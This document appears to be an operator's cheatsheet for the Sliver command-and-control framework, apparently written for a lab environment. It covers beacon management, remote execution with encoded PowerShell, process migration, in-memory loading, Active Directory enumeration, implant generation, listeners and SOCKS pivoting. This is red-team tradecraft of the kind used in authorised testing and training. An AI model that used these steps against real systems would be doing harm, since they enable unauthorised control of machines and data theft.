# Sliver Cheatsheet - v1.5.42 Server / v1.7.4 Client

## Connection
```bash
socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337 &
./sliver-client console
```

## Beacon Management
| Command | Description |
|---------|-------------|
| `beacons` | List all beacons |
| `beacons rm <id>` | Remove beacon from server |
| `use <id>` | Switch active beacon |
| `use` | Interactive session selector |

## Execution (BEACON MODE)
All commands are *queued* and run on beacon check-in. Use `-o` to wait for output.
| Command | Description |
|---------|-------------|
| `execute -o <cmd>` | Run cmd, wait for output |
| `execute -o -- <cmd>` | Pass flags through to cmd |
| `execute -o -- powershell -NoProfile -Enc <b64>` | Encoded PS command |
| `ls <path>` | List directory (use forward slashes) |
| `cat <path>` | Read file (forward slashes) |
| `rm <path>` | Delete file (forward slashes) |
| `upload <local> <remote>` | Upload file |
| `download <remote>` | Download file |
| `ps` | List processes |
| `cd <path>` | Change directory |
| `pwd` | Print working directory |
| `mkdir <path>` | Create directory |
| `runas -u <user> -P <pass> -p <exe>` | Spawn beacon as user |
| `migrate -p <pid>` | Migrate to process |
| `sideload <exe> <args>` | Run PE from memory |
| `sharpcollection <args>` | Run SharpCollection tools |
| `sharp-hound-4 <args>` | Run BloodHound collector |
| `sa-whoami` | BOF: detailed whoami |
| `sa-netstat` | BOF: network connections |
| `sa-sc-enum` | BOF: service enumeration |
| `sa-sc-query <host> <svc>` | BOF: service details |
| `sa-reg-query <host> <key>` | BOF: registry query |
| `sa-adcs-enum` | BOF: ADCS enumeration |
| `sa-netshares <host>` | BOF: enumerate shares |

## Process Migration (Interactive)
| Command | Description |
|---------|-------------|
| `interactive` | Convert beacon to session |
| `interactive <beacon-id>` | Convert specific beacon |
| `use <session-id>` | Switch to interactive session |

## Payload Generation
| Command | Description |
|---------|-------------|
| `generate beacon --mtls <host:port> -N <name> -a amd64` | Generate beacon (issues with v1.5.42 server) |
| `generate beacon --http <host:port> -N <name> -a amd64` | Generate HTTP beacon |
| `profiles` | List existing profiles |
| `implants` | List built implants |
| `regenerate` | Regenerate from saved profile |

## Extensions
| Command | Description |
|---------|-------------|
| `extensions` | List subcommands |
| `extensions list` | List loaded extensions |
| `extensions load <path> [cmd] [args...]` | Load+run extension |
| Aliases dir: `~/.sliver-client/aliases/` | Place alias dirs here |
| Extensions dir: `~/.sliver-client/extensions/` | Place extension dirs here |

## Networking
| Command | Description |
|---------|-------------|
| `socks5 start` | Start SOCKS5 proxy through active beacon |
| `socks5 stop` | Stop SOCKS5 proxy |
| `portfwd add --bind <local> -r <remote>` | Add port forward |
| `portfwd remove --id <id>` | Remove port forward |
| `jobs` | List active listeners/jobs |
| `mtls -L <ip> -l <port>` | Start mTLS listener |
| `http -L <ip> -l <port>` | Start HTTP listener |
| `https -L <ip> -l <port>` | Start HTTPS listener |
| `stage-listener --url <proto>://<ip>:<port> --profile <name>` | Start stager |

## Important Notes
- **Backslash bug**: `execute` strips backslashes from paths. Use forward slashes with Sliver's built-in `ls`/`cat`/`rm` commands, or use PowerShell encoded commands for execute.
- **PowerShell flag conflict**: `-ep` (execution policy) conflicts with Sliver's `-e` (env) flag. Use `--` before PS args or use `-NoProfile -Enc`.
- **Beacon vs Session**: Beacon mode queues commands; Session mode runs instantly. Use `interactive` to convert.
- **"files already exist"**: Sliver reports this even when upload actually succeeded earlier. Check with `ls` first.
- **Check-in interval**: Default ~60s. `execute -o` blocks until next check-in.
